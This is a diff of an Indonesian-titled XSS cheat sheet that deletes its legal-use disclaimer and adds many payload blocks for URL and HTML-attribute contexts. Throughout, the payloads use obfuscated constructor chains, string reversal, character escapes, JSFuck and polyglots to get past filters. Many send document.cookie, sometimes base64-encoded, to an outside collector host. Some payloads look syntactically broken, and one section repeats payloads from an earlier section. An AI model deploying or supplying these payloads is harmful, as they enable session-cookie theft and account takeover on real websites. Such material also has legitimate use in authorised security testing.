@@ -1,5 +1,4 @@
 # Teknik unik pemanggilan alert & exfiltrate data for xss 
-> **⚠️ Legal Disclaimer**: Hanya untuk pembelajaran keamanan, bug bounty legal, dan penetration testing dengan izin tertulis!
 
 ---
 
@@ -47,6 +46,23 @@ window[x]('alert(document.domain)');
 
 <!-- Div hover -->
 <div onmouseover="x='trela'.split('').reverse().join('');window[x](1)">Hover me</div>
+```
+
+#### URL Context Examples
+```html
+javascript:x='trela'.split('').reverse().join('');window[x](1)
+javascript:x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)
+javascript://example.com/%0Ax='trela'.split('').reverse().join('');window[x](document.domain)//
+javascript:%0dx='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)
+javascript:void(x='trela'.split('').reverse().join('');window[x](1))
+javascript:/**/x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="x='trela'.split('').reverse().join('');window[x](1)" x="
+" onload="x='hctef'.split('').reverse().join('');self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie)" x="
+' accesskey='x' onclick='x="trela".split("").reverse().join("");window[x](1)' x='
 ```
 
 #### Advanced: Data Exfiltration
@@ -148,6 +164,26 @@ self[x]('//kiwoyo.requestcatcher.com/exfil', {
 <textarea onfocus="[]['forEach']['constructor']('alert(document.cookie)')()"></textarea>
 ```
 
+#### URL Context Examples
+```html
+javascript:[]['filter']['constructor']('alert(1)')()
+javascript:[]['map']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript://example.com/%0A[]['find']['constructor']('alert(document.domain)')()//
+javascript:void([]['reduce']['constructor']('alert(1)')())
+javascript:/**/[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()
+javascript:%0d[]['forEach']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="[]['map']['constructor']('alert(1)')()" x="
+" onclick="[]['filter']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='[][\"find\"][\"constructor\"](\"alert(1)\")()' x='
+" onload="[]['\x66ilter']['\x63onstructor']('alert(1)')()" x="
+' accesskey='x' onclick='[]["reduce"]["constructor"]("alert(document.domain)")()' x='
+" onfocus="[]['forEach']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Fetch with constructor chain
@@ -242,6 +278,27 @@ self[x]('//kiwoyo.requestcatcher.com/exfil', {
 <!-- Audio -->
 <audio onplay='""["sub"]["constructor"]("alert(document.domain)")()'>
 ```
+
+#### URL Context Examples
+```html
+javascript://example.com/%0A``['toString']['constructor']('alert(1)')()//
+javascript:''['constructor']['constructor']('alert(1)')()
+javascript:""['sub']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:void(''.constructor.constructor('alert(document.domain)')())
+javascript:%0d''['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/""['sub']['constructor']('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="''['constructor']['constructor']('alert(1)')()" x="
+" onclick='""["sub"]["constructor"]("fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)")()' x="
+' onmouseover="``['toString']['constructor']('alert(1)')()" x='
+" onload="''.constructor.constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='""["sub"]["constructor"]("alert(1)")()' x='
+" onfocus="''['constructor']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
 
 #### Advanced: Data Exfiltration
 ```javascript
@@ -344,6 +401,27 @@ false.constructor.constructor('alert(document.cookie)')()
 <summary onclick="true['constructor']['constructor']('alert(document.domain)')()">Click</summary>
 ```
 
+#### URL Context Examples
+```html
+javascript://example.com/%0A(0).constructor.constructor('alert(1)')()//
+javascript:(1)['constructor']['constructor']('alert(1)')()
+javascript:true['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:void(false.constructor.constructor('alert(document.domain)')())
+javascript:%0dtrue['constructor']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/(1)['constructor']['constructor']('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="(1)['constructor']['constructor']('alert(1)')()" x="
+" onclick="true['constructor']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='(0).constructor.constructor("alert(1)")()' x='
+" onload="false.constructor.constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='(1)["constructor"]["constructor"]("alert(1)")()' x='
+" onfocus="true['constructor']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Number constructor exfiltration
@@ -443,6 +521,27 @@ true['constructor']['constructor'](`
 <!-- Iframe -->
 <iframe onload="/x/.constructor.constructor('alert(document.domain)')()">
 ```
+
+#### URL Context Examples
+```html
+javascript:%0d/test/.constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/./['constructor']['constructor']('alert(1)')()
+javascript:/x/.constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript://example.com/%0A/[a-z]/.constructor.constructor('alert(1)')()//
+javascript:void(/\d+/.constructor.constructor('alert(document.domain)')())
+javascript:/**//./['constructor']['constructor']('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="/./['constructor']['constructor']('alert(1)')()" x="
+" onclick="/x/.constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='/[a-z]/.constructor.constructor("alert(1)")()' x='
+" onload="/\d+/.constructor.constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='/test/["constructor"]["constructor"]("alert(1)")()' x='
+" onfocus="/./['constructor']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
 
 #### Advanced: Data Exfiltration
 ```javascript
@@ -545,6 +644,28 @@ true['constructor']['constructor'](`
 <object data=x onerror="[]['find']['constructor']('\x61\x6c\x65\x72\x74(document.domain)')()">
 ```
 
+
+#### URL Context Examples
+```html
+javascript://example.com/%0A[]['\u0066ilter']['\x63onstructor']('\u0061lert(1)')()//
+javascript:[]['filter']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()
+javascript:[]['map']['constructor']('\x66\x65\x74\x63\x68("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:void([]['find']['\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72']('\x61\x6c\x65\x72\x74(1)')())
+javascript:%0d[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162']('\141\154\145\162\164(1)')()
+javascript:/**/.['map']['constructor']('\x66\x65\x74\x63\x68("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="[]['filter']['constructor']('\u0061\u006c\u0065\u0072\u0074(1)')()" x="
+" onclick="[]['map']['constructor']('\x66\x65\x74\x63\x68(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='[]["\u0066ind"]["\x63onstructor"]("\u0061lert(1)")()' x='
+" onload="[]['\146ilter']['\143onstructor']('\141lert(1)')()" x="
+' accesskey='x' onclick='[]["reduce"]["\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72"]("\x61\x6c\x65\x72\x74(1)")()' x='
+" onfocus="[]['map']['constructor']('\x66\x65\x74\x63\x68(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Unicode encoded fetch
@@ -642,6 +763,27 @@ true['constructor']['constructor'](`
 <!-- Select -->
 <select onchange="(alert)`${document.cookie}`"><option>1</option></select>
 ```
+
+#### URL Context Examples
+```html
+javascript:[]['filter']['constructor'](`alert(1)`)()
+javascript:[]['map']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)()
+javascript://example.com/%0A[]['find']['constructor']`return alert(1)`()//
+javascript:void([]['reduce']['constructor'](`alert(document.domain)`)())
+javascript:%0d[]['forEach']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)()
+javascript:/**/.['filter']['constructor'](`alert(1)`)()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="[]['filter']['constructor'](`alert(1)`)()" x="
+" onclick="[]['map']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)()" x="
+' onmouseover='[][&quot;find&quot;][&quot;constructor&quot;]`return alert(1)`()' x='
+" onload="[]['reduce']['constructor'](`alert(document.domain)`)()" x="
+' accesskey='x' onclick='[]["forEach"]["constructor"]`return alert(1)`()' x='
+" onfocus="[]['map']['constructor'](`fetch('//kiwoyo.requestcatcher.com/?leak='+btoa(document.cookie))`)()" autofocus x="
+```
+
 
 #### Advanced: Data Exfiltration
 ```javascript
@@ -755,6 +897,27 @@ with([]){filter.constructor('alert(1)')()}
 <details ontoggle="[].filter.constructor('alert(1)')()">
 ```
 
+#### URL Context Examples
+```html
+javascript:[].filter.constructor('alert(1)')()
+javascript:[].map.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript://example.com/%0A[].find.constructor('alert(1)')()//
+javascript:void([].reduce.constructor('alert(document.domain)')())
+javascript:%0d[].forEach.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/.filter.constructor('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="[].filter.constructor('alert(1)')()" x="
+" onclick="[].map.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='[].find.constructor("alert(1)")()' x='
+" onload="[].reduce.constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='[].forEach.constructor("alert(1)")()' x='
+" onfocus="[].map.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Dot notation exfiltration
@@ -846,6 +1009,27 @@ setInterval('alert(1)',100)
 <!-- Marquee -->
 <marquee onstart="setTimeout('alert(document.domain)')">Scroll</marquee>
 ```
+
+#### URL Context Examples
+```html
+javascript:setTimeout('alert(1)')
+javascript:setTimeout(`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)
+javascript://example.com/%0AsetInterval('alert(1)',100)//
+javascript:void([]['filter']['constructor']('return setTimeout')()('alert(1)',0))
+javascript:%0dsetTimeout('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)',0)
+javascript:/**/setTimeout(`alert(document.domain)`)
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="setTimeout('alert(1)')" x="
+" onclick="setTimeout(`fetch('//kiwoyo.requestcatcher.com/?c='+document.cookie)`)" x="
+' onmouseover='setInterval("alert(1)",100)' x='
+" onload="[]['filter']['constructor']('return setTimeout')()('alert(1)',0)" x="
+' accesskey='x' onclick='setTimeout("alert(document.domain)")' x='
+" onfocus="setTimeout('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))',0)" autofocus x="
+```
+
 
 #### Advanced: Data Exfiltration
 ```javascript
@@ -953,6 +1137,27 @@ try{}catch(e){e.constructor.constructor('alert(1)')()}
 <!-- Select -->
 <select onchange="Error.constructor.constructor('alert(1)')()"><option>1</option></select>
 ```
+
+#### URL Context Examples
+```html
+javascript:Error.constructor.constructor('alert(1)')()
+javascript:(new Error).constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript://example.com/%0Atry{}catch(e){e.constructor.constructor('alert(1)')()}//
+javascript:void(Error.constructor.constructor('alert(document.domain)')())
+javascript:%0d(new Error).constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/Error.constructor.constructor('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="Error.constructor.constructor('alert(1)')()" x="
+" onclick="(new Error).constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='try{}catch(e){e.constructor.constructor("alert(1)")()}' x='
+" onload="Error.constructor.constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='(new Error).constructor.constructor("alert(1)")()' x='
+" onfocus="Error.constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
 
 #### Advanced: Data Exfiltration
 ```javascript
@@ -1068,6 +1273,26 @@ try {
 <canvas onclick="(function*(){}).constructor('alert(1)')()">
 ```
 
+#### URL Context Examples
+```html
+javascript:(function*(){}).constructor('alert(1)')()
+javascript:(async function(){}).constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript://example.com/%0A(async function*(){}).constructor('alert(1)')()//
+javascript:void((function*(){}).constructor('alert(document.domain)')())
+javascript:%0d(async function(){}).constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/(function*(){}).constructor('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="(function*(){}).constructor('alert(1)')()" x="
+" onclick="(async function(){}).constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='(async function*(){}).constructor("alert(1)")()' x='
+" onload="(function*(){}).constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='(async function(){}).constructor("alert(1)")()' x='
+" onfocus="(async function(){}).constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Generator exfiltration
@@ -1180,6 +1405,27 @@ Reflect.get([],'map').constructor('alert(1)')()
 <select onchange="Reflect.get([],'reduce').constructor('alert(1)')()"><option>1</option></select>
 ```
 
+#### URL Context Examples
+```html
+javascript:Reflect.construct(Function,['alert(1)'])()
+javascript:Reflect.get([],'map').constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript://example.com/%0Anew Proxy({},{get:()=>alert})[0](1)//
+javascript:void(Reflect.construct(Function,['alert(document.domain)'])())
+javascript:%0dReflect.get([],'filter').constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/Reflect.construct(Function,['alert(1)'])()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="Reflect.construct(Function,['alert(1)'])()" x="
+" onclick="Reflect.get([],'map').constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='new Proxy({},{get:()=>alert})[0](1)' x='
+" onload="Reflect.get([],'filter').constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='Reflect.construct(Function,["alert(1)"])()' x='
+" onfocus="Reflect.get([],'map').constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Reflect exfiltration
@@ -1288,6 +1534,27 @@ Symbol()[Symbol.toStringTag].constructor.constructor('alert(1)')()
 <canvas onclick="(Symbol()).constructor.constructor('alert(document.domain)')()">
 ```
 
+#### URL Context Examples
+```html
+javascript:Symbol().constructor.constructor('alert(1)')()
+javascript:Symbol()[Symbol.toStringTag].constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript://example.com/%0A(Symbol()).constructor.constructor('alert(1)')()//
+javascript:void(Symbol().constructor.constructor('alert(document.domain)')())
+javascript:%0dSymbol()[Symbol.toStringTag].constructor.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/Symbol().constructor.constructor('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="Symbol().constructor.constructor('alert(1)')()" x="
+" onclick="Symbol()[Symbol.toStringTag].constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='(Symbol()).constructor.constructor("alert(1)")()' x='
+" onload="Symbol().constructor.constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='Symbol().constructor.constructor("alert(1)")()' x='
+" onfocus="Symbol().constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Symbol exfiltration
@@ -1391,6 +1658,27 @@ javascript:[]%5b'filter'%5d%5b'constructor'%5d('alert(1)')()
 <form onsubmit="[]['\146\x69\u006c\164\x65\162']['\x63\157\x6e\x73\164\x72\165\143\164\x6f\162']('\x61\154\145\x72\164(1)')();return false">
 ```
 
+#### URL Context Examples
+```html
+javascript://example.com/%0A[][\u0027\146\x69\154\x74\145\162\u0027][\u0027\143\x6f\x6e\x73\x74\162\x75\143\x74\x6f\162\u0027]('\x61\154\145\162\x74(1)')()//
+javascript:[]['\146\x69\u006c\164\145\162']['\x63\u006f\156\x73\164\x72\165\143\164\x6f\162']('\x61\u006c\145\x72\164(1)')()
+javascript:[]['\146\x69\154\x74\145\162']['\x63\x6f\x6e\x73\164\x72\165\x63\x74\157\x72']('\x66\u0065\164\x63\150("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:void([]['\146\151\x6c\u0074\145\x72']['\143\x6f\156\x73\x74\x72\165\x63\x74\x6f\162']('\141\x6c\x65\162\x74(1)')())
+javascript:%0d[]['\x66\151\u006c\164\x65\162']['\143\157\x6e\x73\164\162\165\143\x74\x6f\162']('\x66\145\x74\143\x68("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/[]['\146\x69\u006c\x74\145\162']['\x63\157\156\x73\164\x72\165\143\164\x6f\162']('\x61\154\145\x72\164(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="Symbol().constructor.constructor('alert(1)')()" x="
+" onclick="Symbol()[Symbol.toStringTag].constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='(Symbol()).constructor.constructor("alert(1)")()' x='
+" onload="Symbol().constructor.constructor('alert(document.domain)')()" x="
+' accesskey='x' onclick='Symbol().constructor.constructor("alert(1)")()' x='
+" onfocus="Symbol().constructor.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Mixed encoding exfiltration
@@ -1472,6 +1760,25 @@ x='hctef'.split('').reverse().join('');
 self[x]('//kiwoyo.requestcatcher.com/?c='+document.cookie);
 </script>
 ```
+#### URL Context Examples
+```html
+javascript:with([]){filter.constructor('alert(1)')()}
+javascript:with([]){map.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()}
+javascript://example.com/%0Awith([]){find.constructor('alert(1)')()}//
+javascript:void(with([]){reduce.constructor('alert(document.domain)')()})
+javascript:%0dwith([]){forEach.constructor('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()}
+javascript:/**/with([]){filter.constructor('alert(1)')()}
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="with([]){filter.constructor('alert(1)')()}" x="
+" onclick="with([]){map.constructor('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()}" x="
+' onmouseover='with([]){find.constructor("alert(1)")()}' x='
+" onload="with([]){reduce.constructor('alert(document.domain)')()}" x="
+' accesskey='x' onclick='with([]){forEach.constructor("alert(1)")()}' x='
+" onfocus="with([]){map.constructor('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')()}" autofocus x="
+```
 
 #### Advanced: Data Exfiltration
 ```javascript
@@ -1543,6 +1850,25 @@ self[x]('//kiwoyo.requestcatcher.com/polyglot?c='+document.cookie);
 <!-- Button with constructor access -->
 <button onclick="[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]][([][(![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]('alert(1)')()">
 ```
+#### URL Context Examples
+```html
+javascript:(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]
+javascript:[][(!![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]][([][(![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]]('alert(1)')()
+javascript://example.com/%0A(![]+[])[+!+[]]//
+javascript:void((![]+[])[!+[]+!+[]])
+javascript:%0d([![]]+[][[]])[+!+[]+[+[]]]
+javascript:/**/(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]" x="
+" onclick="[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]][0]('alert(1)')()" x="
+' onmouseover='(![]+[])[!+[]+!+[]+!+[]]' x='
+" onload="([![]]+[][[]])[+!+[]+[+[]]]" x="
+' accesskey='x' onclick='(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]' x='
+```
+
 
 #### Advanced: Data Exfiltration
 ```javascript
@@ -1603,6 +1929,26 @@ self[x]('//kiwoyo.requestcatcher.com/polyglot?c='+document.cookie);
 <a id="document" href="#">
 <form id="cookie"><input name="cookie"></form>
 <img src=x onerror="[]['reduce']['constructor']('alert(1)')()">
+```
+
+#### URL Context Examples
+```html
+javascript:[]['filter'][Object.keys([]['filter'])[1]]('alert(1)')()
+javascript:[]['map'][[]['map']['constructor']['name']]('alert(1)')()
+javascript://example.com/%0A[]['find'][Object.keys([]['find'])[1]]('alert(1)')()//
+javascript:void([]['reduce'][Object.getOwnPropertyNames([]['reduce'])[1]]('alert(1)')())
+javascript:%0d[]['forEach'][[]['forEach']['constructor']['name']]('alert(1)')()
+javascript:/**/.['filter'][Object.keys([]['filter'])[1]]('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="[]['filter'][Object.keys([]['filter'])[1]]('alert(1)')()" x="
+" onclick="[]['map'][[]['map']['constructor']['name']]('alert(1)')()" x="
+' onmouseover='[]["find"][Object.keys([]["find"])[1]]("alert(1)")()' x='
+" onload="[]['reduce'][Object.getOwnPropertyNames([]['reduce'])[1]]('alert(1)')()" x="
+' accesskey='x' onclick='[]["forEach"][[]["forEach"]["constructor"]["name"]]("alert(1)")()' x='
+" onfocus="[]['map'][Object.keys([]['map'])[1]]('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" autofocus x="
 ```
 
 #### Advanced: Data Exfiltration
@@ -1726,6 +2072,7 @@ with([]){filter.constructor('alert(document.domain)')()}
 <!-- Details -->
 <details ontoggle="with([]){reduce.constructor('alert(document.domain)')()}">
 ```
+
 
 #### Advanced: Data Exfiltration
 ```javascript
@@ -1876,6 +2223,27 @@ with([]){
 ('alert(1)')();return false">
 ```
 
+#### URL Context Examples
+```html
+javascript:[]/*bypass*/['map']/*filter*/['constructor']('alert(1)')()
+javascript:[][/*a*/'filter'/*b*/][/*c*/'constructor'/*d*/]('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript://example.com/%0A[]/*x*/['find']/*y*/['constructor']('alert(1)')()//
+javascript:void([]/**/['reduce']/**/['constructor']('alert(document.domain)')())
+javascript:%0d[]/*1*/['forEach']/*2*/['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()
+javascript:/**/./**/['map']/**/['constructor']('alert(1)')()
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="[]/*bypass*/['map']/*waf*/['constructor']('alert(1)')()" x="
+" onclick="[][/*a*/'filter'/*b*/][/*c*/'constructor'/*d*/]('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='[]/*x*/["find"]/*y*/["constructor"]("alert(1)")()' x='
+" onload="[]/**/['reduce']/**/['constructor']('alert(document.domain)')()" x="
+' accesskey='x' onclick='[]/*1*/["forEach"]/*2*/["constructor"]("alert(1)")()' x='
+" onfocus="[][/*a*/'map'/*b*/][/*c*/'constructor'/*d*/]('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() " autofocus x="
+```
+
+
 #### Advanced: Data Exfiltration
 ```javascript
 // Comments in exfiltration
@@ -2007,6 +2375,27 @@ javascript:/*"></script><img src=x onerror="[]['map']['constructor']('alert(1)')
 <!-- Form + Script polyglot -->
 </form><script>[]['map']['constructor']('alert(1)')()</script><form>
 ```
+
+#### URL Context Examples
+```html
+javascript:/*--></title></style></script><script>[]['filter']['constructor']('alert(1)')()</script>
+javascript:/*"></script><img src=x onerror="[]['map']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()">*/
+javascript://example.com/%0A/*</script><svg onload='[]["find"]["constructor"]("alert(1)")()'></svg>*///
+javascript:void(/*--></script><script>[]['reduce']['constructor']('alert(document.domain)')()</script>*/)
+javascript:%0d/*"></textarea><script>[]['forEach']['constructor']('fetch("//kiwoyo.requestcatcher.com/?c="+document.cookie)')()</script>*/
+javascript:/**//*</style><script>[]['filter']['constructor']('alert(1)')()</script>*/
+```
+
+#### Attribute Context Examples
+```html
+" autofocus onfocus="/*--></script><script>[]['filter']['constructor']('alert(1)')()</script>*/" x="
+" onclick="/*"></script><img src=x onerror=alert(1)>*/[]['map']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?c=\"+document.cookie)')()" x="
+' onmouseover='/*</script><svg onload=alert(1)>*/[]["find"]["constructor"]("alert(1)")()' x='
+" onload="/*--></title></script><script>[]['reduce']['constructor']('alert(document.domain)')()</script>*/" x="
+' accesskey='x' onclick='/*</textarea><script>*/[]["forEach"]["constructor"]("alert(1)")()' x='
+" onfocus="/*"></script><script>[]['map']['constructor']('fetch(\"//kiwoyo.requestcatcher.com/?leak=\"+btoa(document.cookie))')() </script>*/" autofocus x="
+```
+
 
 #### Advanced: Data Exfiltration
 ```javascript
